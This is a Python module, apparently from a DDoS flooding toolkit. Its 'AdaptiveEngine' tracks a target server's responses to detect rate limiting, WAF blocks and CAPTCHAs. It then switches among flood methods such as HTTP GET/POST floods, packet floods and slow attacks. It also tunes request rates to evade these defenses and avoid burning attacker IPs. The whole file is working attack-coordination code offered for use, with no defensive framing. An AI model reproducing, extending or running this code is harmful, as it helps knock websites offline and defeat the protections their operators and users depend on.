"""
Multi-Protocol Concurrency Layer - Adaptive Attack Coordinator
Auto-detects server responses (429, 403, TCP RST) and switches methods/headers dynamically
"""
import asyncio
import time
import random
import logging
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger("adaptive_engine")


class ServerState(Enum):
    """Detected server state"""
    HEALTHY = "healthy"
    RATE_LIMITED = "rate_limited"
    WAF_BLOCKED = "waf_blocked"
    CAPTCHA = "captcha"
    OVERLOADED = "overloaded"
    DOWN = "down"


class AdaptiveStrategy(Enum):
    """Adaptive response strategies"""
    AGGRESSIVE = "aggressive"
    MODERATE = "moderate"
    STEALTH = "stealth"
    RETREAT = "retreat"


@dataclass
class ResponseStats:
    """Track response statistics"""
    total: int = 0
    success: int = 0
    rate_limited: int = 0
    waf_blocked: int = 0
    captcha: int = 0
    errors: int = 0
    timeouts: int = 0
    last_check_time: float = 0
    window_size: int = 100  # Check every N requests


class AdaptiveEngine:
    """
    Adaptive attack engine that:
    1. Monitors server responses in real-time
    2. Detects rate limiting, WAF blocks, CAPTCHAs
    3. Automatically switches methods, headers, or proxies
    4. Implements auto-throttle to prevent IP burnout
    """

    def __init__(self, auto_throttle: bool = True, throttle_threshold: float = 0.9):
        self.auto_throttle = auto_throttle
        self.throttle_threshold = throttle_threshold
        self.stats = ResponseStats()
        self.current_strategy = AdaptiveStrategy.AGGRESSIVE
        self.current_rps_multiplier = 1.0
        self.method_history: List[str] = []
        self._last_state = ServerState.HEALTHY
        self._consecutive_blocks = 0
        self._throttle_active = False

    def record_response(self, status_code: int, method: str = ""):
        """Record a response for analysis"""
        self.stats.total += 1
        self.stats.last_check_time = time.time()

        if status_code == 0:
            self.stats.timeouts += 1
        elif status_code == 429:
            self.stats.rate_limited += 1
            self._consecutive_blocks += 1
        elif status_code in (403, 503):
            self.stats.waf_blocked += 1
            self._consecutive_blocks += 1
        elif status_code == 401:
            self.stats.captcha += 1
            self._consecutive_blocks += 1
        elif status_code >= 500:
            self.stats.errors += 1
        elif status_code >= 200:
            self.stats.success += 1
            self._consecutive_blocks = 0

        if method:
            self.method_history.append(method)

        # Check if we need to adapt
        if self.stats.total % self.stats.window_size == 0:
            self._adapt()

    def detect_state(self) -> ServerState:
        """Detect current server state based on recent responses"""
        if self.stats.total == 0:
            return ServerState.HEALTHY

        error_rate = (self.stats.rate_limited + self.stats.waf_blocked + self.stats.captcha) / max(self.stats.total, 1)
        success_rate = self.stats.success / max(self.stats.total, 1)

        if self.stats.captcha > self.stats.total * 0.5:
            return ServerState.CAPTCHA
        elif self.stats.waf_blocked > self.stats.total * 0.7:
            return ServerState.WAF_BLOCKED
        elif self.stats.rate_limited > self.stats.total * 0.5:
            return ServerState.RATE_LIMITED
        elif self.stats.errors > self.stats.total * 0.5:
            return ServerState.OVERLOADED
        elif success_rate > 0.5:
            return ServerState.HEALTHY
        else:
            return ServerState.DOWN

    def _adapt(self):
        """Adapt strategy based on detected state"""
        state = self.detect_state()

        if state == self._last_state:
            return

        self._last_state = state
        logger.info(f"Server state changed to: {state.value}")

        if state == ServerState.HEALTHY:
            self.current_strategy = AdaptiveStrategy.AGGRESSIVE
            self.current_rps_multiplier = 1.0
            self._throttle_active = False
        elif state == ServerState.RATE_LIMITED:
            self.current_strategy = AdaptiveStrategy.MODERATE
            self.current_rps_multiplier = 0.5
            self._throttle_active = True
        elif state == ServerState.WAF_BLOCKED:
            self.current_strategy = AdaptiveStrategy.STEALTH
            self.current_rps_multiplier = 0.3
            self._throttle_active = True
        elif state == ServerState.CAPTCHA:
            self.current_strategy = AdaptiveStrategy.RETREAT
            self.current_rps_multiplier = 0.1
            self._throttle_active = True
        elif state == ServerState.OVERLOADED:
            self.current_strategy = AdaptiveStrategy.MODERATE
            self.current_rps_multiplier = 0.7
            self._throttle_active = True
        else:
            self.current_strategy = AdaptiveStrategy.RETREAT
            self.current_rps_multiplier = 0.0
            self._throttle_active = True

    def get_recommended_method(self) -> str:
        """Get recommended attack method based on current state"""
        state = self.detect_state()

        method_map = {
            ServerState.HEALTHY: ["http_get_flood", "pps", "dynamic"],
            ServerState.RATE_LIMITED: ["browser", "dynamic", "http_post_flood"],
            ServerState.WAF_BLOCKED: ["browser", "slow", "http_post_flood"],
            ServerState.CAPTCHA: ["slow", "browser"],
            ServerState.OVERLOADED: ["slow", "pps"],
            ServerState.DOWN: ["pps"],
        }

        methods = method_map.get(state, ["http_get_flood"])
        return random.choice(methods)

    def get_recommended_rps(self, base_rps: int) -> int:
        """Get recommended RPS based on current strategy"""
        return max(1, int(base_rps * self.current_rps_multiplier))

    def should_throttle(self) -> bool:
        """Check if we should throttle requests"""
        if not self.auto_throttle:
            return False

        if self.stats.total < self.stats.window_size:
            return False

        error_rate = (self.stats.rate_limited + self.stats.waf_blocked + self.stats.captcha) / max(self.stats.total, 1)
        return error_rate > self.throttle_threshold

    def get_throttle_delay(self) -> float:
        """Get throttle delay in seconds"""
        if not self._throttle_active:
            return 0

        state = self.detect_state()
        delays = {
            ServerState.RATE_LIMITED: random.uniform(0.5, 2.0),
            ServerState.WAF_BLOCKED: random.uniform(1.0, 5.0),
            ServerState.CAPTCHA: random.uniform(2.0, 10.0),
            ServerState.OVERLOADED: random.uniform(0.2, 1.0),
        }
        return delays.get(state, 0)

    def reset(self):
        """Reset statistics and state"""
        self.stats = ResponseStats()
        self.current_strategy = AdaptiveStrategy.AGGRESSIVE
        self.current_rps_multiplier = 1.0
        self._last_state = ServerState.HEALTHY
        self._consecutive_blocks = 0
        self._throttle_active = False

    def get_status(self) -> Dict:
        """Get current adaptive status"""
        return {
            "state": self.detect_state().value,
            "strategy": self.current_strategy.value,
            "rps_multiplier": self.current_rps_multiplier,
            "throttle_active": self._throttle_active,
            "total_requests": self.stats.total,
            "success_rate": self.stats.success / max(self.stats.total, 1),
            "consecutive_blocks": self._consecutive_blocks,
        }
